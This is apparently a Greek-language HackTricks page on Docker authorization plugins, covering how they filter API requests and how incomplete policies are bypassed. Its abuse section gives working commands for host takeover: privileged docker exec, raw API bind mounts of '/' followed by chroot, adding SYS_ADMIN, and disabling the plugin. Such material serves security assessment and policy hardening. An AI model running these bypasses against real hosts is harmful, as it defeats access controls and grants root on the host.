# Plugins Εξουσιοδότησης Runtime

## Επισκόπηση

Τα plugins εξουσιοδότησης Runtime αποτελούν ένα επιπλέον επίπεδο policy που αποφασίζει αν ένας caller επιτρέπεται να εκτελέσει μια συγκεκριμένη ενέργεια του daemon. Το Docker είναι το κλασικό παράδειγμα. Από προεπιλογή, όποιος μπορεί να επικοινωνήσει με το Docker daemon έχει ουσιαστικά ευρύ έλεγχο πάνω του. Τα authorization plugins προσπαθούν να περιορίσουν αυτό το μοντέλο εξετάζοντας τον authenticated user και τη ζητούμενη λειτουργία του API και, στη συνέχεια, επιτρέποντας ή απορρίπτοντας το request σύμφωνα με την policy.

Αυτό το θέμα αξίζει τη δική του σελίδα, επειδή αλλάζει το exploitation model όταν ένας attacker έχει ήδη πρόσβαση σε ένα Docker API ή σε έναν user της ομάδας `docker`. Σε τέτοια περιβάλλοντα, το ερώτημα δεν είναι πλέον μόνο "μπορώ να φτάσω στο daemon;", αλλά επίσης "προστατεύεται το daemon από ένα authorization layer και, αν ναι, μπορεί αυτό το layer να γίνει bypass μέσω endpoints που δεν έχουν γίνει handle, αδύναμου JSON parsing ή permissions για plugin management;"

## Λειτουργία

Όταν ένα request φτάνει στο Docker daemon, το authorization subsystem μπορεί να προωθήσει το context του request σε ένα ή περισσότερα εγκατεστημένα plugins. Το plugin βλέπει την ταυτότητα του authenticated user, τα details του request, επιλεγμένα headers και τμήματα του request ή του response body όταν το content type είναι κατάλληλο. Πολλαπλά plugins μπορούν να συνδεθούν σε chain και η πρόσβαση επιτρέπεται μόνο αν όλα τα plugins επιτρέψουν το request.

Αυτό το μοντέλο φαίνεται ισχυρό, αλλά η ασφάλειά του εξαρτάται πλήρως από το πόσο ολοκληρωμένα έχει κατανοήσει ο author της policy το API. Ένα plugin που μπλοκάρει το `docker run --privileged` αλλά αγνοεί το `docker exec`, παραλείπει εναλλακτικά JSON keys όπως τα top-level `Binds` ή επιτρέπει τη διαχείριση plugins μπορεί να δημιουργήσει μια ψευδή αίσθηση περιορισμού, ενώ εξακολουθεί να αφήνει άμεσα paths για privilege escalation ανοιχτά.

## Συνήθεις Στόχοι Plugins

Σημαντικές περιοχές για policy review είναι:

- endpoints δημιουργίας containers
- πεδία του `HostConfig`, όπως `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` και επιλογές namespace-sharing
- η συμπεριφορά του `docker exec`
- endpoints διαχείρισης plugins
- οποιοδήποτε endpoint μπορεί έμμεσα να ενεργοποιήσει runtime actions εκτός του προβλεπόμενου policy model

Ιστορικά, παραδείγματα όπως το `authz` plugin της Twistlock και απλά εκπαιδευτικά plugins όπως το `authobot` έκαναν αυτό το μοντέλο εύκολο στη μελέτη, επειδή τα policy files και τα code paths τους έδειχναν πώς υλοποιούνταν στην πράξη το endpoint-to-action mapping. Για assessment work, το σημαντικό μάθημα είναι ότι ο author της policy πρέπει να κατανοεί ολόκληρη την επιφάνεια του API και όχι μόνο τις πιο εμφανείς εντολές του CLI.

## Abuse

Ο πρώτος στόχος είναι να μάθεις τι πραγματικά μπλοκάρεται. Αν το daemon απορρίψει μια ενέργεια, το error συχνά κάνει leak το όνομα του plugin, γεγονός που βοηθά στον εντοπισμό του control που χρησιμοποιείται:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Αν χρειάζεστε ευρύτερο endpoint profiling, εργαλεία όπως το `docker_auth_profiler` είναι χρήσιμα, επειδή αυτοματοποιούν την κατά τα άλλα επαναλαμβανόμενη διαδικασία ελέγχου των API routes και των JSON structures που επιτρέπονται πραγματικά από το plugin.

Αν το περιβάλλον χρησιμοποιεί custom plugin και μπορείτε να αλληλεπιδράσετε με το API, καταγράψτε ποια object fields φιλτράρονται πραγματικά:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Αυτοί οι έλεγχοι είναι σημαντικοί, επειδή πολλές αστοχίες authorization αφορούν συγκεκριμένα πεδία και όχι συγκεκριμένες έννοιες. Ένα plugin μπορεί να απορρίπτει ένα μοτίβο CLI χωρίς να αποκλείει πλήρως την αντίστοιχη δομή API.

### Πλήρες Παράδειγμα: Το `docker exec` Προσθέτει Privilege Μετά τη Δημιουργία του Container

Μια policy που αποκλείει τη δημιουργία privileged container, αλλά επιτρέπει τη δημιουργία unconfined container μαζί με `docker exec`, μπορεί και πάλι να παρακαμφθεί:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Εάν ο daemon αποδεχτεί το δεύτερο βήμα, ο χρήστης έχει ανακτήσει μια privileged interactive process μέσα σε ένα container που ο συγγραφέας της policy πίστευε ότι ήταν περιορισμένο.

### Πλήρες Παράδειγμα: Bind Mount Μέσω Raw API

Ορισμένες ελαττωματικές policies εξετάζουν μόνο μία μορφή JSON. Εάν το bind mount του root filesystem δεν αποκλείεται με συνέπεια, το host μπορεί ακόμη να γίνει mount:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Η ίδια ιδέα μπορεί επίσης να εμφανίζεται στο `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Ο αντίκτυπος είναι ένα πλήρες host filesystem escape. Η ενδιαφέρουσα λεπτομέρεια είναι ότι το bypass προέρχεται από ελλιπή κάλυψη της policy και όχι από bug στον kernel.

### Πλήρες παράδειγμα: Μη ελεγμένο Capability Attribute

Αν η policy ξεχάσει να φιλτράρει ένα capability-related attribute, ο attacker μπορεί να δημιουργήσει ένα container που αποκτά ξανά ένα επικίνδυνο capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Μόλις υπάρχει `CAP_SYS_ADMIN` ή μια παρόμοια ισχυρή capability, πολλές τεχνικές breakout που περιγράφονται στα [capabilities.md](protections/capabilities.md) και [privileged-containers.md](privileged-containers.md) καθίστανται προσβάσιμες.

### Πλήρες παράδειγμα: Απενεργοποίηση του Plugin

Εάν επιτρέπονται οι λειτουργίες διαχείρισης plugin, το πιο καθαρό bypass μπορεί να είναι η πλήρης απενεργοποίηση του ελέγχου:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Αυτή είναι μια αποτυχία πολιτικής σε επίπεδο control plane. Το authorization layer υπάρχει, αλλά ο χρήστης που υποτίθεται ότι θα περιοριζόταν εξακολουθεί να έχει δικαίωμα να το απενεργοποιήσει.

## Έλεγχοι

Αυτές οι εντολές αποσκοπούν στον εντοπισμό του αν υπάρχει policy layer και στο αν φαίνεται να είναι πλήρες ή επιφανειακό.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Τι είναι ενδιαφέρον εδώ:

- Μηνύματα άρνησης που περιλαμβάνουν το όνομα ενός plugin επιβεβαιώνουν ένα authorization layer και συχνά αποκαλύπτουν την ακριβή υλοποίηση.
- Μια λίστα plugin που είναι ορατή στον attacker μπορεί να αρκεί για να διαπιστωθεί αν είναι δυνατές οι ενέργειες απενεργοποίησης ή επαναδιαμόρφωσης.
- Μια policy που αποκλείει μόνο τις προφανείς ενέργειες CLI, αλλά όχι τα raw API requests, θα πρέπει να θεωρείται bypassable μέχρι να αποδειχθεί το αντίθετο.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Δεν είναι ενεργοποιημένο από προεπιλογή | Η πρόσβαση στον daemon είναι ουσιαστικά all-or-nothing, εκτός αν έχει ρυθμιστεί authorization plugin | incomplete plugin policy, blacklists αντί για allowlists, επιτρεπόμενη διαχείριση plugin, field-level blind spots |
| Podman | Δεν υπάρχει κοινό άμεσο ισοδύναμο | Το Podman βασίζεται συνήθως περισσότερο σε Unix permissions, rootless execution και αποφάσεις σχετικά με την έκθεση του API παρά σε Docker-style authz plugins | ευρεία έκθεση ενός rootful Podman API, weak socket permissions |
| containerd / CRI-O | Διαφορετικό control model | Αυτά τα runtime βασίζονται συνήθως σε socket permissions, node trust boundaries και controls του orchestrator σε υψηλότερο επίπεδο, αντί για Docker authz plugins | mounting του socket σε workloads, weak node-local trust assumptions |
| Kubernetes | Χρησιμοποιεί authn/authz στα επίπεδα του API-server και του kubelet, όχι Docker authz plugins | Τα cluster RBAC και admission controls αποτελούν το κύριο policy layer | overbroad RBAC, weak admission policy, άμεση έκθεση των kubelet ή runtime APIs |

{{#include ../../../banners/hacktricks-training.md}}
